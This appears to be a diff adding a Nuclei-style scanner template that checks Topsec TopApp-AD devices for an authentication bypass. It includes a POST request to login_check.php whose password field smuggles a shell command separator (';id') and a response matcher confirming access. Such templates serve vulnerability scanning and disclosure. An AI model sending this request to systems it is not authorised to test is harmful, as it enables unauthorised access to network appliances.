@@ -1,0 +1,31 @@
+id: TopApp-AD-LoginBypass
+info:
+  name: Topsec TopApp-AD login bypass vulnerability (system logs in directly without password)
+  author:
+  - l0ne1y
+  description: |-
+    Topsec TopApp-AD authentication bypass vulnerability
+    Topsec TopApp-AD application delivery system is the application delivery device with the most complete functionality in the industry.
+
+    Topsec TopApp-AD has an authentication bypass vulnerability. Attackers can exploit it to bypass login and enter the system.
+  severity: high
+  remediation: |2-
+
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Validate user input on both the frontend and backend simultaneously, using a dual validation mechanism.
+    2. Verify whether the user has permission to invoke the relevant functionality before calling it.
+    3. Fix this authentication bypass vulnerability in a timely manner.
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - ' contains(body,"Main.php") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/login_check.php'
+  method: POST
+  body: userName={{rand_base(4,"abcdefghjklmn")}}&password=%3Bid&x=38&y=28
